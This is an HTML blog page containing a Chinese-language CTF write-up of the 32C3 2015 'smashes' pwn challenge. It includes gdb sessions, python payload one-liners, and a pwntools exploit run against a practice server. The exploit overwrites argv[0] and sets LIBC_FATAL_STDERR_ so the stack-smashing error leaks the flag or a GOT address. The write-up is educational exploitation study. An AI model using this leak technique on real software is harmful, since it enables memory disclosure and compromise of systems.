<!DOCTYPE HTML>
<html>

<head>
	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
	 <link rel="shortcut icon" href="/img/logo_miccall.png">
	
			
    <title>
    w0lfzhang's blog
    </title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="/css/mic_main.css" />
    <link rel="stylesheet" href="/css/dropdownMenu.css" />
    
    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	
    <noscript>
        <link rel="stylesheet" href="/css/noscript.css" />
    </noscript>

			    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.scrollex.min.js"></script>
    <script src="/js/jquery.scrolly.min.js"></script>
    <script src="/js/skel.min.js"></script>
    <script src="/js/util.js"></script>
    <script src="/js/main.js"></script>
	
</head>
    
		
<!-- Layouts -->



<!--  代码渲染  -->
<link rel="stylesheet" href="/css/prism_coy.css" />
<link rel="stylesheet" href="/css/typo.css" />
<!-- 文章页 -->
<body class="is-loading">
    <!-- Wrapper 外包 s-->
    <div id="wrapper" class="fade-in">
        <!-- Intro 头部显示 s -->
        <!-- Intro 头部显示 e -->
        <!-- Header 头部logo start -->
        <header id="header">
    <a href="/" class="logo">MICCALL</a>
</header>
        <!-- Nav 导航条 start -->
        <nav id="nav" class="special" >
            <ul class="menu links" >
			<!-- Homepage  主页  --> 
			<li >
	            <a href="/" rel="nofollow">主页</a>
	        </li>
			<!-- categories_name  分类   --> 
	        
	        <li class="active">
	            <a href="#s1">分类</a>
	                    <ul class="submenu">
	                        <li>
	                        <a class="category-link" href="/categories/arm/">arm</a></li><li><a class="category-link" href="/categories/crypto/">crypto</a></li><li><a class="category-link" href="/categories/ctf-practice/">ctf_practice</a></li><li><a class="category-link" href="/categories/cve-analysis/">cve_analysis</a></li><li><a class="category-link" href="/categories/fuzzing/">fuzzing</a></li><li><a class="category-link" href="/categories/heap-exploit/">heap_exploit</a></li><li><a class="category-link" href="/categories/kernel-development/">kernel_development</a></li><li><a class="category-link" href="/categories/kernel-exploit/">kernel_exploit</a></li><li><a class="category-link" href="/categories/kernel-exploit-practice/">kernel_exploit_practice</a></li><li><a class="category-link" href="/categories/linux-security/">linux security</a></li><li><a class="category-link" href="/categories/misc-exploit/">misc_exploit</a></li><li><a class="category-link" href="/categories/pwnable-kr/">pwnable.kr</a></li><li><a class="category-link" href="/categories/stack-exploit/">stack_exploit</a></li><li><a class="category-link" href="/categories/windows-exploit/">windows_exploit</a>
	                    </ul>
	        </li>
	        
	        <!-- archives  归档   --> 
	        
	        
		        <!-- Pages 自定义   -->
		        
		        <li>
		            <a href="/about/" title="简历">
		                简历
		            </a>
		        </li>
		        
		        <li>
		            <a href="/group/" title="团队">
		                团队
		            </a>
		        </li>
		        
		        <li>
		            <a href="/gallery/" title="图库">
		                图库
		            </a>
		        </li>
		        
		        <li>
		            <a href="/tag/" title="标签">
		                标签
		            </a>
		        </li>
		        


            </ul>
            <!-- icons 图标   -->
			<ul class="icons">
		            
		                <li><a href="https://github.com/miccall" class="icon fa-github"><span class="label">GitHub</span></a></li>
		            
		            
		            
		            
			</ul>
</nav>

        <div id="main" >
            <div class ="post_page_title_img" style="height: 25rem;background-image: url(undefined);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >2015 32C3 CTF smashes</h2></a>
            </div>
            <!-- Post -->
            <div class="typo" style="padding: 3rem;">
                <p>不久前做了一个比较有趣的题，觉得这个题脑洞确实比较大，也在这个题中学到了一些东西，所以记录一下</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p>先看一下<a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200" target="_blank" rel="external">程序</a>：<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">func</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v0; <span class="comment">// rax@1</span></div><div class="line">  __int64 v1; <span class="comment">// rbx@2</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax@3</span></div><div class="line">  __int64 name; <span class="comment">// [sp+0h] [bp-128h]@1</span></div><div class="line">  __int64 canary; <span class="comment">// [sp+108h] [bp-20h]@1</span></div><div class="line"></div><div class="line">  canary = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</div><div class="line">  LODWORD(v0) = _IO_gets(&amp;name);</div><div class="line">  <span class="keyword">if</span> ( !v0 )</div><div class="line">LABEL_9:</div><div class="line">    _exit(<span class="number">1</span>);</div><div class="line">  v1 = <span class="number">0L</span>L;</div><div class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    v2 = _IO_getc(<span class="built_in">stdin</span>);</div><div class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_9;</div><div class="line">    <span class="keyword">if</span> ( v2 == <span class="number">10</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    byte_600D20[v1++] = v2;</div><div class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_8;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v1 + <span class="number">6294816L</span>L), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - v1));</div><div class="line">LABEL_8:</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ canary;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>_IO_gets那明显有栈溢出。</p>
<p>再来看一下开了哪些保护：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# checksec smashes </div><div class="line">[*] '/root/Desktop/smashes'</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">    FORTIFY:  Enabled</div></pre></td></tr></table></figure></p>
<p>程序开了canary和fortify，因此无法用常规方法。一时不会做，只能去求助他人了，问了好几个师傅都不会，后来在某位师傅的帮助下找到了原题。</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这题得利用fortify的报错泄露信息，有趣吧~~~其实就是当栈溢出时，程序终止退出的时候会调用 __stack_chk_fail函数打印argv[0]这个指针指向的字符串，默认是程序的名字。所以如果我们把它覆盖为flag的地址时，它就会把flag给打印出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span></div><div class="line">__attribute__ ((noreturn))</div><div class="line">__stack_chk_fail (<span class="keyword">void</span>)</div><div class="line">  &#123;</div><div class="line">     __fortify_fail (<span class="string">"stack smashing detected"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span></div><div class="line">__attribute__ ((noreturn)) internal_function</div><div class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</div><div class="line">  &#123;</div><div class="line">    <span class="comment">/* The loop is added only to keep gcc happy.  */</span></div><div class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">      __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</div><div class="line">              msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# python -c 'print "a"*0x200 + "\n" + "a"' | ./smashes </div><div class="line">Hello!</div><div class="line">What's your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.</div><div class="line">Please overwrite the flag: Thank you, bye!</div><div class="line">*** stack smashing detected ***: ./smashes terminated</div></pre></td></tr></table></figure>
<p>然后我们要确认argv[0]距离缓冲区的距离。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> b *0x000000000040080E</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x400804:	xor    eax,eax</div><div class="line">   0x400806:	call   0x4006b0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x40080b:	mov    rdi,rsp</div><div class="line">=&gt; 0x40080e:	call   0x4006c0 &lt;_IO_gets@plt&gt;</div><div class="line">   0x400813:	test   rax,rax</div><div class="line">   0x400816:	je     0x40089f</div><div class="line">   0x40081c:	mov    rdx,rsp</div><div class="line">   0x40081f:	mov    esi,0x400960</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0x7fffffffe1a0 --&gt; 0x1 </div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffe1a0 --&gt; 0x1 </div><div class="line">0008| 0x7fffffffe1a8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 ("GLIBC_2.2.5")</div><div class="line">0016| 0x7fffffffe1b0 --&gt; 0x1 </div><div class="line">0024| 0x7fffffffe1b8 --&gt; 0x0 </div><div class="line">0032| 0x7fffffffe1c0 --&gt; 0x1 </div><div class="line">0040| 0x7fffffffe1c8 --&gt; 0x600cc0 --&gt; 0x7ffff7aa7920 (&lt;setbuf&gt;:	mov    edx,0x2000)</div><div class="line">0048| 0x7fffffffe1d0 --&gt; 0x4006ee (xor    ebp,ebp)</div><div class="line">0056| 0x7fffffffe1d8 --&gt; 0x7fffffffe3b0 --&gt; 0x1 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 3, 0x000000000040080e in ?? ()</div><div class="line"><span class="meta">gdb-peda$</span> find /root</div><div class="line">Searching for '/root' in: None ranges</div><div class="line">Found 4 results, display max 4 items:</div><div class="line">[stack] : 0x7fffffffe667 ("/root/Desktop/smashes")</div><div class="line">[stack] : 0x7fffffffee22 ("/root/Desktop")</div><div class="line">[stack] : 0x7fffffffee8c --&gt; 0x445800746f6f722f ('/root')</div><div class="line">[stack] : 0x7fffffffefe2 ("/root/Desktop/smashes")</div><div class="line"><span class="meta"></span></div><div class="line">gdb-peda$ find 0x7fffffffe667</div><div class="line">Searching for '0x7fffffffe667' in: None ranges</div><div class="line">Found 2 results, display max 2 items:</div><div class="line">   libc : 0x7ffff7dd64b8 --&gt; 0x7fffffffe667 ("/root/Desktop/smashes")</div><div class="line">[stack] : 0x7fffffffe3b8 --&gt; 0x7fffffffe667 ("/root/Desktop/smashes")</div><div class="line"><span class="meta"></span></div><div class="line">gdb-peda$ distance $rsp 0x7fffffffe3b8</div><div class="line">From 0x7fffffffe1a0 to 0x7fffffffe3b8: 536 bytes, 134 dwords</div></pre></td></tr></table></figure></p>
<p>由上面可以知道argv[0]距离缓冲区的距离为0x218个字节。<br>我们在本地覆盖一下argv[0]:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# python -c 'print "a"*0x218+"\x20\x0d\x40\x00\x00\x00\x00\x00"+"\n"+"a"' | ./smashes </div><div class="line">Hello!</div><div class="line">What's your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.aaaaaaaaaaaaaaa </div><div class="line">Please overwrite the flag: Thank you, bye!</div><div class="line">*** stack smashing detected ***: PCTF&#123;Here's the flag on server&#125; terminated</div></pre></td></tr></table></figure></p>
<p>注意不要用原来flag的地址覆盖，因为原来存储flag的地方会被overwrite。但是由于ELF的映射方式，此flag会被映射两次，另外一个地方flag的内容不会变。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> find PCTF</div><div class="line">Searching for 'PCTF' in: None ranges</div><div class="line">Found 2 results, display max 2 items:</div><div class="line">smashes : 0x400d20 ("PCTF&#123;Here's the flag on server&#125;")  &lt;== target address</div><div class="line">smashes : 0x600d20 ("PCTF&#123;Here's the flag on server&#125;")</div></pre></td></tr></table></figure></p>
<p>OK，成功了。但时在连接远程时不会成功，原因是<a href="http://osxr.org:8080/glibc/source/sysdeps/posix/libc_fatal.c" target="_blank" rel="external">__libc_message</a>函数的问题。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span></div><div class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</div><div class="line">&#123;</div><div class="line">  va_list ap; </div><div class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>; </div><div class="line"></div><div class="line">  va_start (ap, fmt);</div><div class="line"></div><div class="line">  <span class="comment">/* Open a descriptor for /dev/tty unless the user explicitly</span></div><div class="line">     requests errors on standard error.  */</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *on_2 = __libc_secure_getenv (<span class="string">"LIBC_FATAL_STDERR_"</span>);</div><div class="line">  <span class="keyword">if</span> (on_2 == <span class="literal">NULL</span> || *on_2 == <span class="string">'\0'</span>)</div><div class="line">    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) </div><div class="line">    fd = STDERR_FILENO;</div><div class="line"></div><div class="line">  <span class="comment">/*......*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如果LIBC_FATAL_STDERR_环境变量没有设置或者为空，stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。<br>所以我们必须设置这个环境变量，正好可以用这个环境变量去覆盖flag的内容(但是我在虚拟机里打另一台虚拟机却始终没实验成功，远程打也有不成功的时候)。不知道为什么.<br>最终的exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">old_flag_addr = <span class="number">0x600d20</span></div><div class="line">new_flag_addr = <span class="number">0x400d20</span></div><div class="line"></div><div class="line">debug = <span class="number">0</span></div><div class="line"><span class="keyword">if</span> debug:</div><div class="line">    p = process(<span class="string">'./smashes'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"name?"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x218</span> + p64(new_flag_addr) </div><div class="line">payload += p64(<span class="number">0</span>) + p64(old_flag_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"flag: "</span>)</div><div class="line">env = <span class="string">"LIBC_FATAL_STDERR_=1"</span></div><div class="line">p.sendline(env)</div><div class="line"></div><div class="line">flag = p.recv()</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
<p>最终得到的结果如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# python smashes.py </div><div class="line">[+] Opening connection to pwn.jarvisoj.com on port 9877: Done</div><div class="line">Thank you, bye!</div><div class="line">*** stack smashing detected ***: PCTF&#123;57dErr_Smasher_good_work!&#125; terminated</div><div class="line"></div><div class="line">[*] Closed connection to pwn.jarvisoj.com port 9877</div></pre></td></tr></table></figure></p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>根据glibc的源码可知，只要程序开了canary栈保护，就可以覆盖argv[0]来泄露想要的信息(&amp;set LIBC_FATAL_STDERR_=1)。我又另外试验了一次，确实可以：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# checksec test</div><div class="line">[*] '/root/Desktop/test'</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line"></div><div class="line">root@kali:~/Desktop# python -c 'print "a"*280+"\x60\x09\x60\x00\x00\x00\x00\x00"' | ./test </div><div class="line">*** stack smashing detected ***: �Z��� terminated</div><div class="line">Segmentation fault</div></pre></td></tr></table></figure></p>
<p>上面我泄露的是read@got的地址，要注意的是如果有\x00截断的话就不行了。(we can leank 2 address and search in libcdatabase)</p>
<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200" target="_blank" rel="external">write-ups-2015/32c3-ctf-2015/pwn/readme-200</a></p>

            </div>

            <!-- Post Comments -->
            
    <!-- 使用 DISQUS_CLICK -->
<div id="disqus-comment">
    <div id="disqus_thread"></div>

<!-- add animation -->
<style>
	.disqus_click_btn {
            line-height: 30px;
            margin: 0;
            min-width: 50px;
            padding: 0 14px;
            display: inline-block;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 0;
            overflow: hidden;
            will-change: box-shadow;
            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
            outline: 0;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            vertical-align: middle;
            border: 0;
            background: rgba(158, 158, 158, .2);
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
            color: #fff;
            background-color: #7EC0EE;
            text-shadow: 0
        }
</style>
	
<div class="btn_click_load" id="disqus_bt"> 
    <button class="disqus_click_btn">点击查看评论</button>
</div>

<!--
<script type="text/javascript">
$('.btn_click_load').click(function() {
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    document.getElementById('disqus_bt').style.display = "none";
});
</script>
-->
<script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'http://yoursite.com/2016/10/28/2015-32C3-CTF-smashes/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://yoursite.com/2016/10/28/2015-32C3-CTF-smashes/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
</script>

<script type="text/javascript">
    $('.btn_click_load').click(function() {  //click to load comments
        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document;
            var s = d.createElement('script');
            s.src = '//http-miccall-tech.disqus.com/embed.js';
            s.setAttribute('data-timestamp', + new Date());
            (d.head || d.body).appendChild(s);
        })();
        $('.btn_click_load').css('display','none');
    });
</script>
</div>
<style>
    #disqus-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>


        </div>
        <!-- Copyright 版权 start -->
                <div id="copyright">
            <ul>
                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
            </ul>
            
            	<span id="busuanzi_container_site_pv">2017总访问量<span id="busuanzi_value_site_pv"></span>次</span>
			
        </div>
    </div>
</body>



 	
</html>
